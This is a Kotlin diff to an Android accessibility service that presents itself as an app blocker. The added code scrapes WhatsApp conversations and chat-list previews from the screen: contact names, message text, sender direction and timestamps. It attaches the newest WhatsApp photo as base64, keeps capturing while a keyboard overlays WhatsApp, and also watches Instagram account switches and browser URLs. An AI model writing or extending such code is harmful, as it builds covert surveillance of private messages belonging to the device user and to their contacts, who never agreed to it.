@@ -70,6 +70,7 @@ class BlockAccessibilityService : AccessibilityService() {
     private var lastBlockedPackage: String? = null
     private var lastBlockedAt = 0L
     private var lastRecordedUrl: String? = null
+    private var currentForegroundApp: String? = null
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     private val pollHandler = Handler(Looper.getMainLooper())
@@ -147,26 +148,41 @@ class BlockAccessibilityService : AccessibilityService() {
                 stopBrowserPolling()
             }
 
-            if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
-                startWhatsAppPolling()
-            } else {
-                stopWhatsAppPolling()
-            }
+            val isImeOrSystem = packageName.startsWith("com.google.android.inputmethod") ||
+                    packageName.contains("honeyboard") ||
+                    packageName.contains("swiftkey") ||
+                    packageName.contains("keyboard") ||
+                    packageName.contains("inputmethod") ||
+                    packageName == "android" ||
+                    packageName == "com.android.systemui"
 
-            if (packageName == "com.instagram.android") {
-                detectAndHandleInstagramAccountSwitch(rootInActiveWindow)
-                startInstagramPolling()
-            } else {
-                stopInstagramPolling()
-            }
+            if (!isImeOrSystem) {
+                currentForegroundApp = packageName
 
-            checkAppRule(packageName)
+                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
+                    startWhatsAppPolling()
+                } else {
+                    stopWhatsAppPolling()
+                }
+
+                if (packageName == "com.instagram.android") {
+                    detectAndHandleInstagramAccountSwitch(rootInActiveWindow)
+                    startInstagramPolling()
+                } else {
+                    stopInstagramPolling()
+                }
+
+                checkAppRule(packageName)
+            }
         }
 
         // Real-time WhatsApp capture:
         // Trigger immediately when user taps (e.g. clicks Send button), when messages appear on screen,
         // when scrolling through chats/conversation, or when window state changes
-        if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
+        val isWhatsAppActive = packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" ||
+                ((currentForegroundApp == "com.whatsapp" || currentForegroundApp == "com.whatsapp.w4b") &&
+                 (packageName.startsWith("com.google.android.inputmethod") || packageName.contains("honeyboard") || packageName.contains("keyboard")))
+        if (isWhatsAppActive) {
             if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                 eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                 eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
@@ -195,7 +211,7 @@ class BlockAccessibilityService : AccessibilityService() {
      * Periodically inspects WhatsApp's active conversation window while WhatsApp is foreground.
      */
     private var whatsAppPollRunnable: Runnable? = null
-    private val whatsAppPollIntervalMs = 2000L
+    private val whatsAppPollIntervalMs = 1500L
     private val capturedWhatsAppMsgHashes = mutableSetOf<String>()
 
     private fun startWhatsAppPolling() {
@@ -218,16 +234,36 @@ class BlockAccessibilityService : AccessibilityService() {
     fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
         if (root == null) return
         try {
+            // Traverse up to find the true window root node even if a child was passed
+            var topRoot: AccessibilityNodeInfo = rootInActiveWindow ?: root
+            while (topRoot.parent != null) {
+                topRoot = topRoot.parent ?: break
+            }
+
+            val pkg = topRoot.packageName?.toString() ?: root.packageName?.toString() ?: ""
+            if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
+
             val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
             val now = System.currentTimeMillis()
+            val displayMetrics = resources.displayMetrics
+            val screenWidth = displayMetrics.widthPixels
+            val screenHeight = displayMetrics.heightPixels
+
+            fun cleanStr(s: String?): String {
+                if (s == null) return ""
+                return s.replace('\u202F', ' ')
+                    .replace('\u00A0', ' ')
+                    .replace('\u200B', ' ')
+                    .trim()
+            }
 
             fun collectTexts(node: AccessibilityNodeInfo?): List<String> {
                 if (node == null) return emptyList()
                 val list = mutableListOf<String>()
                 fun walk(n: AccessibilityNodeInfo?) {
                     if (n == null) return
-                    val t = n.text?.toString()?.trim()
-                    if (!t.isNullOrBlank()) {
+                    val t = cleanStr(n.text?.toString())
+                    if (t.isNotBlank()) {
                         list.add(t)
                     }
                     for (i in 0 until n.childCount) {
@@ -239,378 +275,397 @@ class BlockAccessibilityService : AccessibilityService() {
             }
 
             fun isTimeOrDate(s: String): Boolean {
-                val trimmed = s.trim()
-                return trimmed.matches(Regex("^[0-9]{1,2}:[0-9]{2}(\\s*[AaPpMm]{2})?$")) ||
-                       trimmed.equals("yesterday", ignoreCase = true) ||
-                       trimmed.equals("today", ignoreCase = true) ||
-                       trimmed.matches(Regex("^[0-9]{1,2}[/.-][0-9]{1,2}([/.-][0-9]{2,4})?$")) ||
-                       trimmed in setOf("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday")
+                val clean = cleanStr(s)
+                return clean.matches(Regex("^[0-9]{1,2}:[0-9]{2}(\\s*[AaPpMm]{2})?$")) ||
+                       clean.matches(Regex("^[0-9]{1,2}:[0-9]{2}:[0-9]{2}(\\s*[AaPpMm]{2})?$")) ||
+                       clean.matches(Regex("^[0-9]{1,2}:[0-9]{2}\\s*(?:am|pm|AM|PM)?\\s*[,.]?.*$")) ||
+                       clean.equals("yesterday", ignoreCase = true) ||
+                       clean.equals("today", ignoreCase = true) ||
+                       clean.matches(Regex("^[0-9]{1,2}[/.-][0-9]{1,2}([/.-][0-9]{2,4})?$")) ||
+                       clean in setOf("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday")
             }
 
             fun isSystemLabel(s: String): Boolean {
-                val trimmed = s.trim().lowercase()
+                val trimmed = cleanStr(s).lowercase()
                 return trimmed in setOf(
                     "whatsapp", "whatsapp business", "chats", "updates", "calls", "communities",
                     "settings", "search", "archived", "unread", "groups", "all", "type a message",
-                    "message", "status", "delivered", "read", "navigate up", "back", "more options",
-                    "call", "video call", "voice call", "online", "typing...", "typing", "audio call",
-                    "ask meta ai or search", "ask meta ai", "meta ai", "floating windows",
-                    "search unread chats", "not interested", "interested", "reels", "follow",
-                    "recent contact", "recent conversation", "tap to view conversation"
-                )
+                    "message", "status", "delivered", "read", "sent", "pending", "edited",
+                    "navigate up", "back", "more options", "call", "video call", "voice call",
+                    "online", "typing...", "typing", "audio call", "ask meta ai or search",
+                    "ask meta ai", "meta ai", "floating windows", "search unread chats",
+                    "not interested", "interested", "reels", "follow", "recent contact",
+                    "recent conversation", "tap to view conversation", "tap to load",
+                    "forwarded", "forwarded many times", "unread messages",
+                    "this message was deleted", "you deleted this message", "swipe to reply"
+                ) || trimmed.contains("end-to-end encrypted") ||
+                     trimmed.startsWith("you reacted") || trimmed.startsWith("reacted ")
             }
 
             fun isBadge(s: String): Boolean {
-                val trimmed = s.trim()
+                val trimmed = cleanStr(s)
                 return trimmed.matches(Regex("^[0-9]+$")) && (trimmed.toIntOrNull() ?: 0) in 1..999
             }
 
             fun parseBubbleTime(timeStr: String?): Long {
                 if (timeStr.isNullOrBlank()) return now
                 try {
-                    val clean = timeStr.trim().uppercase()
-                    val calendar = java.util.Calendar.getInstance()
-                    val format = if (clean.contains("AM") || clean.contains("PM")) {
-                        java.text.SimpleDateFormat("h:mm a", java.util.Locale.US)
-                    } else {
-                        java.text.SimpleDateFormat("HH:mm", java.util.Locale.US)
-                    }
-                    val parsed = format.parse(clean)
-                    if (parsed != null) {
-                        val parsedCal = java.util.Calendar.getInstance().apply { time = parsed }
-                        calendar.set(java.util.Calendar.HOUR_OF_DAY, parsedCal.get(java.util.Calendar.HOUR_OF_DAY))
-                        calendar.set(java.util.Calendar.MINUTE, parsedCal.get(java.util.Calendar.MINUTE))
-                        calendar.set(java.util.Calendar.SECOND, 0)
-                        calendar.set(java.util.Calendar.MILLISECOND, 0)
-                        if (calendar.timeInMillis > now + 300_000) {
-                            calendar.add(java.util.Calendar.DAY_OF_YEAR, -1)
+                    val clean = cleanStr(timeStr).uppercase()
+                    val match = Regex("([0-9]{1,2}:[0-9]{2})(?:\\s*([AP]M))?").find(clean)
+                    if (match != null) {
+                        val baseTime = match.groupValues[1]
+                        val amPm = match.groupValues.getOrNull(2)
+                        val calendar = java.util.Calendar.getInstance()
+                        val format = if (!amPm.isNullOrBlank()) {
+                            java.text.SimpleDateFormat("h:mm a", java.util.Locale.US)
+                        } else {
+                            java.text.SimpleDateFormat("HH:mm", java.util.Locale.US)
                         }
-                        return calendar.timeInMillis
+                        val strToParse = if (!amPm.isNullOrBlank()) "$baseTime $amPm" else baseTime
+                        val parsed = format.parse(strToParse)
+                        if (parsed != null) {
+                            val parsedCal = java.util.Calendar.getInstance().apply { time = parsed }
+                            calendar.set(java.util.Calendar.HOUR_OF_DAY, parsedCal.get(java.util.Calendar.HOUR_OF_DAY))
+                            calendar.set(java.util.Calendar.MINUTE, parsedCal.get(java.util.Calendar.MINUTE))
+                            calendar.set(java.util.Calendar.SECOND, 0)
+                            calendar.set(java.util.Calendar.MILLISECOND, 0)
+                            if (calendar.timeInMillis > now + 300_000) {
+                                calendar.add(java.util.Calendar.DAY_OF_YEAR, -1)
+                            }
+                            return calendar.timeInMillis
+                        }
                     }
                 } catch (_: Exception) {}
                 return now
             }
 
-            fun hasConversationInput(node: AccessibilityNodeInfo?): Boolean {
-                if (node == null) return false
-                if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return true
-                for (i in 0 until node.childCount) {
-                    if (hasConversationInput(node.getChild(i))) return true
-                }
-                return false
-            }
+            // Inspect window navigation structure
+            var hasBackButton = false
+            var hasCallButtons = false
+            var hasComposer = false
+            var hasBottomTabs = false
 
-            val displayMetrics = resources.displayMetrics
-            val screenWidth = displayMetrics.widthPixels
-            val isInOpenConversation = hasConversationInput(root)
+            fun inspectWindowNav(n: AccessibilityNodeInfo?, depth: Int = 0) {
+                if (n == null || depth > 8) return
+                val cd = cleanStr(n.contentDescription?.toString())
+                val text = cleanStr(n.text?.toString())
+                val vId = (n.viewIdResourceName ?: "").lowercase()
+
+                if (cd.equals("Navigate up", ignoreCase = true) || cd.equals("Back", ignoreCase = true) || vId.endsWith(":id/back")) {
+                    val r = Rect()
+                    n.getBoundsInScreen(r)
+                    if (r.top < screenHeight * 0.20 && r.left < screenWidth * 0.35) {
+                        hasBackButton = true
+                    }
+                }
+
+                if (cd.contains("Video call", ignoreCase = true) || cd.contains("Voice call", ignoreCase = true) || cd.equals("Call", ignoreCase = true) || vId.contains("call_btn")) {
+                    val r = Rect()
+                    n.getBoundsInScreen(r)
+                    if (r.top < screenHeight * 0.20) {
+                        hasCallButtons = true
+                    }
+                }
+
+                if (vId.endsWith(":id/entry") || vId.endsWith(":id/send") || vId.endsWith(":id/voice_note_btn") ||
+                    text.equals("Type a message", ignoreCase = true) || text.equals("Message", ignoreCase = true) ||
+                    (n.isEditable && vId.contains("entry"))) {
+                    hasComposer = true
+                }
+
+                if (cd.equals("Chats", ignoreCase = true) || cd.equals("Updates", ignoreCase = true) || cd.equals("Communities", ignoreCase = true) || cd.equals("Calls", ignoreCase = true) ||
+                    text.equals("Chats", ignoreCase = true) || text.equals("Updates", ignoreCase = true)) {
+                    val r = Rect()
+                    n.getBoundsInScreen(r)
+                    if (r.bottom > screenHeight * 0.75 || vId.contains("tab") || vId.contains("nav")) {
+                        hasBottomTabs = true
+                    }
+                }
+
+                for (i in 0 until n.childCount) {
+                    inspectWindowNav(n.getChild(i), depth + 1)
+                }
+            }
+            inspectWindowNav(topRoot)
+
+            val isInOpenConversation = (hasBackButton || (hasCallButtons && hasComposer)) && !hasBottomTabs
 
             if (isInOpenConversation) {
                 // =============================================================
                 // 1. OPEN CONVERSATION SCREEN: Capture active chat messages
                 // =============================================================
                 var chatTitle: String? = null
-                val titleIdCandidates = listOf(
-                    "com.whatsapp:id/conversation_contact_name",
-                    "com.whatsapp.w4b:id/conversation_contact_name",
-                    "com.whatsapp:id/conversation_title",
-                    "com.whatsapp.w4b:id/conversation_title",
-                    "com.whatsapp:id/action_bar_title",
-                    "com.whatsapp.w4b:id/action_bar_title",
-                    "com.whatsapp:id/contact_title",
-                    "com.whatsapp.w4b:id/contact_title",
-                    "com.whatsapp:id/user_name",
-                    "com.whatsapp:id/title"
+                val titleCandidates = listOf(
+                    "conversation_contact_name",
+                    "conversation_title",
+                    "action_bar_title",
+                    "contact_name",
+                    "user_name",
+                    "main_title",
+                    "title"
                 )
-                for (id in titleIdCandidates) {
-                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
-                    if (!nodes.isNullOrEmpty()) {
-                        val candidate = nodes[0].text?.toString()?.trim()
-                        if (!candidate.isNullOrBlank() && !isSystemLabel(candidate) && !isTimeOrDate(candidate)) {
-                            chatTitle = candidate
-                            break
-                        }
-                    }
-                }
 
-                // Fallback: scan top action bar area (top 380px)
-                if (chatTitle.isNullOrBlank()) {
-                    val headerNodes = mutableListOf<AccessibilityNodeInfo>()
-                    fun findHeader(node: AccessibilityNodeInfo?) {
-                        if (node == null) return
-                        val rect = Rect()
-                        node.getBoundsInScreen(rect)
-                        if (rect.top < 380 && node.text != null && node.text.isNotBlank()) {
-                            headerNodes.add(node)
-                        }
-                        for (i in 0 until node.childCount) {
-                            findHeader(node.getChild(i))
+                fun findTitleByViewId(n: AccessibilityNodeInfo?): String? {
+                    if (n == null) return null
+                    val vId = (n.viewIdResourceName ?: "").lowercase()
+                    for (cand in titleCandidates) {
+                        if (vId.endsWith(":id/$cand") || vId.endsWith("/$cand")) {
+                            val t = cleanStr(n.text?.toString())
+                            if (t.isNotBlank() && !isSystemLabel(t) && !isTimeOrDate(t) && !isBadge(t) && t.length in 2..60) {
+                                return t
+                            }
                         }
                     }
-                    findHeader(root)
-                    chatTitle = headerNodes.firstOrNull {
-                        val s = it.text.toString().trim()
-                        !isSystemLabel(s) && !isTimeOrDate(s) && !isBadge(s) && !s.contains("online") && !s.contains("last seen") && s.length < 50
-                    }?.text?.toString()?.trim()
+                    for (i in 0 until n.childCount) {
+                        val found = findTitleByViewId(n.getChild(i))
+                        if (found != null) return found
+                    }
+                    return null
+                }
+                chatTitle = findTitleByViewId(topRoot)
+
+                // Fallback: search top action bar area (top 18% of screen)
+                if (chatTitle.isNullOrBlank()) {
+                    val headerTexts = mutableListOf<String>()
+                    fun findHeader(n: AccessibilityNodeInfo?) {
+                        if (n == null) return
+                        val t = cleanStr(n.text?.toString())
+                        val r = Rect()
+                        n.getBoundsInScreen(r)
+                        if (t.isNotBlank() && r.top < screenHeight * 0.18 && r.bottom > 20 && r.left >= screenWidth * 0.08 && r.left <= screenWidth * 0.75) {
+                            headerTexts.add(t)
+                        }
+                        for (i in 0 until n.childCount) {
+                            findHeader(n.getChild(i))
+                        }
+                    }
+                    findHeader(topRoot)
+
+                    chatTitle = headerTexts.firstOrNull { s ->
+                        val clean = cleanStr(s)
+                        !isSystemLabel(clean) && !isTimeOrDate(clean) && !isBadge(clean) &&
+                        !clean.contains("online", ignoreCase = true) &&
+                        !clean.contains("last seen", ignoreCase = true) &&
+                        !clean.contains("typing", ignoreCase = true) &&
+                        !clean.contains("tap here", ignoreCase = true) &&
+                        !clean.contains("click here", ignoreCase = true) &&
+                        clean.length in 2..60
+                    }
                 }
 
                 if (!chatTitle.isNullOrBlank()) {
-                    val msgIdList = listOf(
-                        "com.whatsapp:id/message_text",
-                        "com.whatsapp.w4b:id/message_text",
-                        "com.whatsapp:id/caption",
-                        "com.whatsapp.w4b:id/caption",
-                        "com.whatsapp:id/conversation_text",
-                        "com.whatsapp.w4b:id/conversation_text",
-                        "com.whatsapp:id/msg_text",
-                        "com.whatsapp.w4b:id/msg_text",
-                        "com.whatsapp:id/text",
-                        "com.whatsapp:id/message_body"
-                    )
-                    var messageNodes: List<AccessibilityNodeInfo>? = null
-                    for (id in msgIdList) {
-                        val nodes = root.findAccessibilityNodeInfosByViewId(id)
-                        if (!nodes.isNullOrEmpty()) {
-                            messageNodes = nodes
-                            break
-                        }
-                    }
+                    val messageTextCandidates = mutableListOf<AccessibilityNodeInfo>()
 
-                    if (messageNodes.isNullOrEmpty()) {
-                        val textList = mutableListOf<AccessibilityNodeInfo>()
-                        fun collectMessageTexts(node: AccessibilityNodeInfo?) {
-                            if (node == null) return
-                            if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
-                            val t = node.text?.toString()?.trim()
-                            val rect = Rect()
-                            node.getBoundsInScreen(rect)
-                            if (!t.isNullOrBlank() && !isTimeOrDate(t) && !isSystemLabel(t) && rect.top > 120 && rect.bottom <= (displayMetrics.heightPixels - 100)) {
-                                if (t != chatTitle && !t.contains("end-to-end encrypted") &&
+                    fun collectConversationTexts(n: AccessibilityNodeInfo?, depth: Int = 0) {
+                        if (n == null || depth > 12) return
+                        if (n.isEditable || n.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
+
+                        val r = Rect()
+                        n.getBoundsInScreen(r)
+
+                        // Message bubbles must be below the top action bar and above the bottom input bar
+                        if (r.top >= screenHeight * 0.07 && r.bottom <= (screenHeight - 30)) {
+                            val t = cleanStr(n.text?.toString())
+                            if (t.isNotBlank()) {
+                                if (t != chatTitle &&
+                                    !isSystemLabel(t) &&
+                                    !isTimeOrDate(t) &&
                                     !t.equals("Type a message", ignoreCase = true) &&
-                                    !t.equals("Message", ignoreCase = true)) {
-                                    textList.add(node)
+                                    !t.equals("Message", ignoreCase = true)
+                                ) {
+                                    messageTextCandidates.add(n)
                                 }
                             }
-                            for (i in 0 until node.childCount) {
-                                collectMessageTexts(node.getChild(i))
-                            }
                         }
-                        collectMessageTexts(root)
-                        if (textList.isNotEmpty()) {
-                            messageNodes = textList
+
+                        for (i in 0 until n.childCount) {
+                            collectConversationTexts(n.getChild(i), depth + 1)
                         }
                     }
+                    collectConversationTexts(topRoot)
 
-                    if (!messageNodes.isNullOrEmpty()) {
-                        for (node in messageNodes) {
-                            if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) continue
-                            val text = node.text?.toString()?.trim() ?: continue
-                            if (text.isBlank() || isTimeOrDate(text) || isSystemLabel(text)) continue
-                            if (text.equals("Type a message", ignoreCase = true) || text.equals("Message", ignoreCase = true)) continue
+                    for (node in messageTextCandidates) {
+                        val rawText = node.text?.toString()?.trim() ?: continue
+                        val cleanText = cleanStr(rawText)
+                        if (cleanText.isBlank() || isSystemLabel(cleanText) || isTimeOrDate(cleanText)) continue
 
-                            val rect = Rect()
-                            node.getBoundsInScreen(rect)
-                            val parentRect = Rect()
-                            node.parent?.getBoundsInScreen(parentRect)
+                        val rect = Rect()
+                        node.getBoundsInScreen(rect)
 
-                            val isOutgoing = (parentRect.right >= screenWidth - 120 && parentRect.left > 80) ||
-                                             (rect.right >= screenWidth * 0.72) ||
-                                             (rect.centerX() > screenWidth * 0.48)
-
-                            var bubbleTimeMs = (now / 60_000) * 60_000
-                            try {
-                                val parent = node.parent
-                                if (parent != null) {
-                                    val siblingTexts = collectTexts(parent)
-                                    val timeText = siblingTexts.firstOrNull { isTimeOrDate(it) }
-                                    if (timeText != null) {
-                                        bubbleTimeMs = parseBubbleTime(timeText)
-                                    } else {
-                                        val grandTexts = collectTexts(parent.parent)
-                                        val grandTime = grandTexts.firstOrNull { isTimeOrDate(it) }
-                                        if (grandTime != null) {
-                                            bubbleTimeMs = parseBubbleTime(grandTime)
-                                        }
-                                    }
-                                }
-                            } catch (_: Exception) {}
-
-                            var mediaType: String? = null
-                            var mediaPath: String? = null
-                            if (text.contains("📷") || text.contains("Photo", ignoreCase = true) || text.contains("View photo", ignoreCase = true)) {
-                                mediaType = "image"
-                                try {
-                                    mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
-                                } catch (_: Exception) {}
+                        // Find bubble container
+                        var bubbleContainer: AccessibilityNodeInfo? = node.parent
+                        var bubbleRect = Rect()
+                        node.parent?.getBoundsInScreen(bubbleRect)
+                        var containerDepth = 0
+                        while (bubbleContainer != null && containerDepth < 4) {
+                            val cr = Rect()
+                            bubbleContainer.getBoundsInScreen(cr)
+                            if (cr.width() in (screenWidth * 0.15).toInt()..(screenWidth * 0.96).toInt() && cr.height() in 25..900) {
+                                bubbleRect = cr
+                                break
                             }
-
-                            val dedupeKey = "MSG|$chatTitle|$text|$isOutgoing|$bubbleTimeMs"
-                            if (capturedWhatsAppMsgHashes.contains(dedupeKey)) continue
-                            capturedWhatsAppMsgHashes.add(dedupeKey)
-                            if (capturedWhatsAppMsgHashes.size > 2000) {
-                                capturedWhatsAppMsgHashes.clear()
-                            }
-
-                            entriesToInsert += WhatsAppMessageEntry(
-                                chatName = chatTitle,
-                                sender = if (isOutgoing) "me" else chatTitle,
-                                messageText = text,
-                                isOutgoing = isOutgoing,
-                                messageTimeEpochMs = bubbleTimeMs,
-                                mediaType = mediaType,
-                                mediaPath = mediaPath
-                            )
+                            bubbleContainer = bubbleContainer.parent
+                            containerDepth++
                         }
+                        if (bubbleContainer == null) bubbleContainer = node.parent
+
+                        val containerTexts = mutableListOf<String>()
+                        val containerDescriptions = mutableListOf<String>()
+                        fun walkBubble(bNode: AccessibilityNodeInfo?, bDepth: Int = 0) {
+                            if (bNode == null || bDepth > 5) return
+                            cleanStr(bNode.text?.toString()).let { if (it.isNotBlank()) containerTexts.add(it) }
+                            cleanStr(bNode.contentDescription?.toString()).let { if (it.isNotBlank()) containerDescriptions.add(it) }
+                            for (i in 0 until bNode.childCount) {
+                                walkBubble(bNode.getChild(i), bDepth + 1)
+                            }
+                        }
+                        walkBubble(bubbleContainer)
+
+                        // Direction determination
+                        val hasOutgoingReceipt = containerDescriptions.any {
+                            it.equals("Delivered", ignoreCase = true) ||
+                            it.equals("Read", ignoreCase = true) ||
+                            it.equals("Sent", ignoreCase = true) ||
+                            it.contains("Delivered", ignoreCase = true) ||
+                            it.contains("Read", ignoreCase = true)
+                        }
+                        val isRightAligned = (bubbleRect.right >= screenWidth * 0.82 && bubbleRect.left > screenWidth * 0.15) ||
+                                             (rect.right >= screenWidth * 0.80 && rect.left > screenWidth * 0.20)
+                        val isLeftAligned = (bubbleRect.left <= screenWidth * 0.18 && bubbleRect.right < screenWidth * 0.88) ||
+                                            (rect.left <= screenWidth * 0.20 && rect.right < screenWidth * 0.80)
+
+                        val isOutgoing = hasOutgoingReceipt || isRightAligned || (!isLeftAligned && rect.centerX() > screenWidth * 0.50)
+
+                        // Timestamp extraction
+                        var bubbleTimeMs = (now / 60_000) * 60_000
+                        val timeCand = containerTexts.firstOrNull { isTimeOrDate(it) }
+                            ?: containerDescriptions.firstOrNull { isTimeOrDate(it) }
+                        if (timeCand != null) {
+                            bubbleTimeMs = parseBubbleTime(timeCand)
+                        }
+
+                        // Media & Reel link extraction
+                        val foundReel = WhatsAppNotificationListener.extractReelUrl(cleanText)
+                        val isReel = foundReel != null
+                        val isImage = !isReel && (
+                            cleanText.contains("📷") ||
+                            cleanText.equals("Photo", ignoreCase = true) ||
+                            cleanText.contains("View photo", ignoreCase = true)
+                        )
+                        val isVideo = !isReel && !isImage && (
+                            cleanText.contains("🎥") ||
+                            cleanText.equals("Video", ignoreCase = true)
+                        )
+                        val isAudio = !isReel && !isImage && !isVideo && (
+                            cleanText.contains("Voice message", ignoreCase = true) ||
+                            cleanText.equals("Audio", ignoreCase = true)
+                        )
+
+                        val mediaType = when {
+                            isReel -> "reel"
+                            isImage -> "image"
+                            isVideo -> "video"
+                            isAudio -> "audio"
+                            else -> null
+                        }
+
+                        var mediaPath: String? = null
+                        if (isImage) {
+                            try {
+                                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
+                            } catch (_: Exception) {}
+                        }
+
+                        val finalMsgText = when {
+                            isReel && cleanText.isBlank() -> foundReel ?: "Instagram Reel"
+                            isImage && cleanText.isBlank() -> "Photo"
+                            isVideo && cleanText.isBlank() -> "Video"
+                            isAudio && cleanText.isBlank() -> "Voice message"
+                            else -> cleanText
+                        }
+
+                        val dedupeKey = "MSG|$chatTitle|$finalMsgText|$isOutgoing|${bubbleTimeMs / 60_000}"
+                        if (capturedWhatsAppMsgHashes.contains(dedupeKey)) continue
+                        capturedWhatsAppMsgHashes.add(dedupeKey)
+                        if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
+
+                        entriesToInsert += WhatsAppMessageEntry(
+                            chatName = chatTitle,
+                            sender = if (isOutgoing) "me" else chatTitle,
+                            messageText = finalMsgText,
+                            isOutgoing = isOutgoing,
+                            messageTimeEpochMs = bubbleTimeMs,
+                            mediaType = mediaType,
+                            mediaPath = mediaPath,
+                            reelUrl = foundReel
+                        )
                     }
                 }
             } else {
                 // =============================================================
                 // 2. CHATS LIST SCREEN: Capture all conversation rows & snippets
                 // =============================================================
-                val rowContactCandidates = listOf(
-                    "com.whatsapp:id/conversations_row_contact_name",
-                    "com.whatsapp.w4b:id/conversations_row_contact_name",
-                    "com.whatsapp:id/conversations_row_title",
-                    "com.whatsapp.w4b:id/conversations_row_title",
-                    "com.whatsapp:id/conversations_contact_name",
-                    "com.whatsapp.w4b:id/conversations_contact_name",
-                    "com.whatsapp:id/chat_title",
-                    "com.whatsapp.w4b:id/chat_title",
-                    "com.whatsapp:id/contact_name",
-                    "com.whatsapp.w4b:id/contact_name"
-                )
-                var rowContactNodes: List<AccessibilityNodeInfo>? = null
-                for (id in rowContactCandidates) {
-                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
-                    if (!nodes.isNullOrEmpty()) {
-                        rowContactNodes = nodes
-                        break
+                val candidateRows = mutableListOf<AccessibilityNodeInfo>()
+                fun findChatRows(node: AccessibilityNodeInfo?, depth: Int = 0) {
+                    if (node == null || depth > 10) return
+                    val count = node.childCount
+                    val rect = Rect()
+                    node.getBoundsInScreen(rect)
+                    val w = rect.width()
+                    val h = rect.height()
+                    if ((node.isClickable || count in 1..10) && w > (screenWidth * 0.5) && h in 70..420) {
+                        val texts = collectTexts(node)
+                        if (texts.size >= 2 && texts.any { !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) }) {
+                            candidateRows.add(node)
+                        }
+                    }
+                    for (i in 0 until count) {
+                        findChatRows(node.getChild(i), depth + 1)
                     }
                 }
+                findChatRows(topRoot)
 
-                if (!rowContactNodes.isNullOrEmpty()) {
-                    for (node in rowContactNodes) {
-                        val name = node.text?.toString()?.trim() ?: continue
-                        if (name.isBlank() || isSystemLabel(name) || isTimeOrDate(name)) continue
+                for (row in candidateRows) {
+                    val texts = collectTexts(row)
+                    val candidateTitles = texts.filter {
+                        !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) && it.length <= 50
+                    }
+                    if (candidateTitles.isNotEmpty()) {
+                        val title = candidateTitles.first()
+                        val nonTitleTexts = texts.filter { it != title && !isTimeOrDate(it) && !isBadge(it) && !isSystemLabel(it) }
 
-                        // Look inside the conversation row container for preview message and time
-                        var preview: String? = null
-                        var rowTimeMs = now
-                        var isRowOutgoing = false
-                        try {
-                            var container: AccessibilityNodeInfo? = node.parent
-                            var depth = 0
-                            while (container != null && depth < 5) {
-                                val r = Rect()
-                                container.getBoundsInScreen(r)
-                                if (r.width() > screenWidth * 0.7 && (container.isClickable || r.height() in 80..400)) {
-                                    break
-                                }
-                                container = container.parent
-                                depth++
-                            }
-                            if (container == null) container = node.parent?.parent ?: node.parent
+                        var rowSender: String? = null
+                        val senderCandidate = nonTitleTexts.firstOrNull { it.endsWith(":") }
+                        if (senderCandidate != null) {
+                            rowSender = senderCandidate.removeSuffix(":").trim().removePrefix("~").trim()
+                        }
 
-                            if (container != null) {
-                                val snippetIds = listOf(
-                                    "com.whatsapp:id/conversations_row_snippet",
-                                    "com.whatsapp.w4b:id/conversations_row_snippet",
-                                    "com.whatsapp:id/single_msg_tv",
-                                    "com.whatsapp.w4b:id/single_msg_tv",
-                                    "com.whatsapp:id/msg_from_tv",
-                                    "com.whatsapp:id/last_message"
-                                )
-                                for (snipId in snippetIds) {
-                                    val snipNodes = container.findAccessibilityNodeInfosByViewId(snipId)
-                                    if (!snipNodes.isNullOrEmpty()) {
-                                        val sText = snipNodes[0].text?.toString()?.trim()
-                                        if (!sText.isNullOrBlank() && !isSystemLabel(sText) && !isTimeOrDate(sText) && !isBadge(sText)) {
-                                            preview = sText
-                                            break
-                                        }
-                                    }
-                                }
-                                val texts = collectTexts(container)
-                                val timeText = texts.firstOrNull { isTimeOrDate(it) }
-                                if (timeText != null) {
-                                    rowTimeMs = parseBubbleTime(timeText)
-                                }
-                                if (preview == null) {
-                                    preview = texts.firstOrNull { it != name && !isTimeOrDate(it) && !isBadge(it) && !isSystemLabel(it) && it.length > 1 }
-                                }
-                                if (preview?.startsWith("You: ", ignoreCase = true) == true) {
-                                    isRowOutgoing = true
-                                    preview = preview.substring(5).trim()
-                                }
-                            }
-                        } catch (_: Exception) {}
+                        var snippet = nonTitleTexts.firstOrNull { it != senderCandidate }
+                        val timeText = texts.firstOrNull { isTimeOrDate(it) }
+                        val rowTimeMs = if (timeText != null) parseBubbleTime(timeText) else now
 
-                        if (!preview.isNullOrBlank() && preview != "Recent conversation" && !isSystemLabel(preview)) {
-                            val dedupeKey = "ROW|$name|$preview|$rowTimeMs"
+                        var isSnippetOutgoing = false
+                        if (snippet?.startsWith("You: ", ignoreCase = true) == true) {
+                            isSnippetOutgoing = true
+                            snippet = snippet.substring(5).trim()
+                            rowSender = "me"
+                        } else if (snippet?.startsWith("You reacted ", ignoreCase = true) == true) {
+                            isSnippetOutgoing = true
+                            rowSender = "me"
+                        }
+
+                        if (!snippet.isNullOrBlank() && snippet != "Recent conversation" && !isSystemLabel(snippet)) {
+                            val dedupeKey = "ROW|$title|$snippet|$rowTimeMs"
                             if (!capturedWhatsAppMsgHashes.contains(dedupeKey)) {
                                 capturedWhatsAppMsgHashes.add(dedupeKey)
                                 if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
